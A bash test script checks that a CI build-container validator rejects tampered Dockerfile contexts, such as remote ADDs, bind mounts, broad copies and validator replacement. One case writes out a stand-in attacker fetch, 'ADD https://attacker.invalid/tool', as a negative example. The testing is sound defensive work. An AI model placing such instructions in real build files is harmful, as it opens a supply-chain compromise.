#!/usr/bin/env bash
set -euo pipefail

DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
ROOT=$(cd -- "$DIR/../../../.." && pwd)
ASSERT="$DIR/../../../docker/build-app-cli/assert-build-container-context.sh"
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

pass=0
fail=0
ok() {
  printf '  \033[32mok\033[0m   %s\n' "$1"
  pass=$((pass + 1))
}
no() {
  printf '  \033[31mFAIL\033[0m %s\n' "$1" >&2
  fail=$((fail + 1))
}
assert_pass() {
  local description=$1
  shift
  local log="$WORK/assert-pass.log"
  if "$@" >"$log" 2>&1; then
    ok "$description"
  else
    cat "$log" >&2
    no "$description"
  fi
}
assert_fail() {
  local description=$1
  shift
  if "$@" >/dev/null 2>&1; then no "$description"; else ok "$description"; fi
}

run_assert() {
  bash "$ASSERT" --context "$1"
}

copy_context() {
  local name=$1 destination="$WORK/$1"
  mkdir "$destination"
  while IFS= read -r path; do
    mkdir -p "$destination/$(dirname -- "$path")"
    cp "$ROOT/$path" "$destination/$path"
  done <"$ROOT/.github/docker/build-app-cli/image-context-paths.txt"
  printf '%s\n' "$destination"
}

mutate_dockerfile() {
  local name=$1 instruction=$2 context
  context=$(copy_context "$name")
  printf '%s\n' "$instruction" >>"$context/.github/docker/build-app-cli/Dockerfile"
  run_assert "$context"
}

insert_before_user() {
  local name=$1 instruction=$2 context
  context=$(copy_context "$name")
  awk -v instruction="$instruction" '
    /^USER 1001:1001$/ { print instruction }
    { print }
  ' "$context/.github/docker/build-app-cli/Dockerfile" >"$context/Dockerfile.new"
  mv "$context/Dockerfile.new" "$context/.github/docker/build-app-cli/Dockerfile"
  run_assert "$context"
}

echo "== build-container context contract =="

if grep -Eq '^#[[:space:]]*syntax=' "$ROOT/.github/docker/build-app-cli/Dockerfile"; then
  no "the Dockerfile does not select a mutable external frontend"
else
  ok "the Dockerfile does not select a mutable external frontend"
fi

context=$(copy_context valid)
assert_pass "the staged image context is closed and buildable" run_assert "$context"

context=$(copy_context missing-validator-source)
rm "$context/.github/tools/edgezero-provenance-validator/src/lib.rs"
assert_fail "a missing standalone-validator source is rejected" run_assert "$context"

context=$(copy_context extra-context-file)
printf extra >"$context/extra"
assert_fail "an extra context file is rejected" run_assert "$context"

context=$(copy_context missing-source-revision-guard)
awk '
  /^RUN test "\$\{#IMAGE_SOURCE_REVISION\}"/ { skip = 2 }
  skip > 0 { skip--; next }
  { print }
' "$context/.github/docker/build-app-cli/Dockerfile" >"$context/Dockerfile.new"
mv "$context/Dockerfile.new" "$context/.github/docker/build-app-cli/Dockerfile"
assert_fail "a missing source-revision build guard is rejected" run_assert "$context"

context=$(copy_context outside-path-dependency)
printf '\noutside = { path = "../../../../outside" }\n' \
  >>"$context/.github/tools/edgezero-provenance-validator/Cargo.toml"
assert_fail "a path dependency outside the validator directory is rejected" run_assert "$context"

assert_fail "a remote ADD is rejected" \
  mutate_dockerfile remote-add 'ADD https://attacker.invalid/tool /usr/local/bin/tool'
assert_fail "a build-context bind mount is rejected" \
  mutate_dockerfile bind-mount 'RUN --mount=type=bind,source=.,target=/src true'
assert_fail "a broad context copy is rejected" \
  mutate_dockerfile broad-copy 'COPY . /src'
assert_fail "a post-install validator replacement is rejected" \
  mutate_dockerfile replace-validator \
    'COPY .tool-versions /usr/local/bin/edgezero-provenance-validator'
assert_fail "a pre-USER validator replacement is rejected" \
  insert_before_user replace-validator-before-user \
    'COPY .tool-versions /usr/local/bin/edgezero-provenance-validator'
assert_fail "a pre-USER command cannot mutate installed assets" \
  insert_before_user replace-tool-before-user \
    'RUN rm -f /usr/local/bin/fastly'

context=$(copy_context second-validator-build)
printf '%s\n' \
  'RUN cargo build --locked --release --manifest-path .github/tools/edgezero-provenance-validator/Cargo.toml' \
  >>"$context/.github/docker/build-app-cli/Dockerfile"
assert_fail "a second validator build invocation is rejected" run_assert "$context"

printf 'Passed: %d  Failed: %d\n' "$pass" "$fail"
[[ "$fail" -eq 0 ]]
